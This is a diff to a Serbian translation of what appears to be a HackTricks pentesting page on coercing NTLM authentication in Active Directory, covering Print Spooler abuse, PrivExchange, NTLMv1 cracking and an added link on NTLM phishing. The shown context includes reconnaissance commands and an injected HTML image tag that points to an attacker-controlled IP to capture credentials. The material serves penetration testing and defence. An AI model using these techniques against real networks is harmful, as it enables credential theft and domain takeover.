@@ -8,8 +8,8 @@
 
 ## Spooler Service Abuse
 
-Ako je _**Print Spooler**_ servis **omogućen,** možete koristiti neke već poznate AD akreditive da **zatražite** od štampača na kontroleru domena **ažuriranje** o novim poslovima štampe i jednostavno mu reći da **pošalje obaveštenje nekom sistemu**.\
-Napomena: kada štampač pošalje obaveštenje na proizvoljne sisteme, mora da se **autentifikuje** prema tom **sistemu**. Stoga, napadač može naterati _**Print Spooler**_ servis da se autentifikuje prema proizvoljnom sistemu, a servis će **koristiti račun računara** u ovoj autentifikaciji.
+Ako je _**Print Spooler**_ servis **omogućen,** možete koristiti neke već poznate AD akreditive da **zatražite** od štampača na kontroleru domena **ažuriranje** novih štampanja i jednostavno mu reći da **pošalje obaveštenje nekom sistemu**.\
+Napomena: kada štampač pošalje obaveštenje nekom proizvoljnom sistemu, mora da se **autentifikuje** protiv tog **sistema**. Stoga, napadač može naterati _**Print Spooler**_ servis da se autentifikuje protiv proizvoljnog sistema, a servis će **koristiti račun računara** u ovoj autentifikaciji.
 
 ### Finding Windows Servers on the domain
 
@@ -19,7 +19,7 @@ Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (Operati
 ```
 ### Pronalaženje Spooler usluga koje slušaju
 
-Koristeći malo modifikovani @mysmartlogin-ov (Vincent Le Toux) [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket), proverite da li Spooler usluga sluša:
+Koristeći malo izmenjeni @mysmartloginov (Vincent Le Toux) [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket), proverite da li Spooler usluga sluša:
 ```bash
 . .\Get-SpoolStatus.ps1
 ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
@@ -51,9 +51,9 @@ https://github.com/p0dalirius/Coercer
 
 ## PrivExchange
 
-Napad `PrivExchange` je rezultat greške pronađene u **Exchange Server `PushSubscription` funkciji**. Ova funkcija omogućava da bilo koji korisnik domena sa poštanskim sandučetom natera Exchange server da se autentifikuje na bilo kojem klijentskom hostu putem HTTP-a.
+Napad `PrivExchange` je rezultat greške pronađene u **Exchange Server `PushSubscription` funkciji**. Ova funkcija omogućava da Exchange server bude primoran od strane bilo kog korisnika domena sa poštanskim sandučetom da se autentifikuje na bilo kojem klijentskom hostu preko HTTP-a.
 
-Podrazumevano, **Exchange servis radi kao SYSTEM** i ima prekomerne privilegije (specifično, ima **WriteDacl privilegije na domen pre-2019 Kumulativna Ažuriranja**). Ova greška se može iskoristiti za omogućavanje **preusmeravanja informacija na LDAP i naknadno izvlačenje NTDS baze podataka domena**. U slučajevima kada preusmeravanje na LDAP nije moguće, ova greška se i dalje može koristiti za preusmeravanje i autentifikaciju na druge hostove unutar domena. Uspešna eksploatacija ovog napada omogućava trenutni pristup Administraciji Domenom sa bilo kojim autentifikovanim korisničkim nalogom domena.
+Podrazumevano, **Exchange servis radi kao SYSTEM** i ima prekomerne privilegije (specifično, ima **WriteDacl privilegije na domen pre-2019 Kumulativno Ažuriranje**). Ova greška se može iskoristiti da omogući **preusmeravanje informacija na LDAP i naknadno izvlačenje NTDS baze podataka domena**. U slučajevima kada preusmeravanje na LDAP nije moguće, ova greška se i dalje može koristiti za preusmeravanje i autentifikaciju na druge hostove unutar domena. Uspešna eksploatacija ovog napada omogućava trenutni pristup Administraciji Domenom sa bilo kojim autentifikovanim korisničkim nalogom domena.
 
 ## Unutar Windows-a
 
@@ -98,13 +98,19 @@ i kada ga otvori, pokušaće da se autentifikuje.
 
 ### MitM
 
-Ako možete da izvršite MitM napad na računar i ubrizgate HTML u stranicu koju će vizualizovati, mogli biste pokušati da ubrizgate sliku poput sledeće u stranicu:
+Ako možete da izvršite MitM napad na računar i ubrizgate HTML na stranicu koju će vizualizovati, mogli biste pokušati da ubrizgate sliku poput sledeće na stranicu:
 ```html
 <img src="\\10.10.17.231\test.ico" height="1" width="1" />
 ```
-## Cracking NTLMv1
+## Drugi načini za forsiranje i phishing NTLM autentifikacije
 
-Ako možete uhvatiti [NTLMv1 izazove pročitajte ovde kako ih probiti](../ntlm/index.html#ntlmv1-attack).\
-_Pametite da da biste probili NTLMv1 morate postaviti Responder izazov na "1122334455667788"_
+{{#ref}}
+../ntlm/places-to-steal-ntlm-creds.md
+{{#endref}}
+
+## Razbijanje NTLMv1
+
+Ako možete da uhvatite [NTLMv1 izazove pročitajte ovde kako da ih razbijete](../ntlm/index.html#ntlmv1-attack).\
+_Pametite da da biste razbili NTLMv1 morate postaviti Responder izazov na "1122334455667788"_
 
 {{#include ../../banners/hacktricks-training.md}}
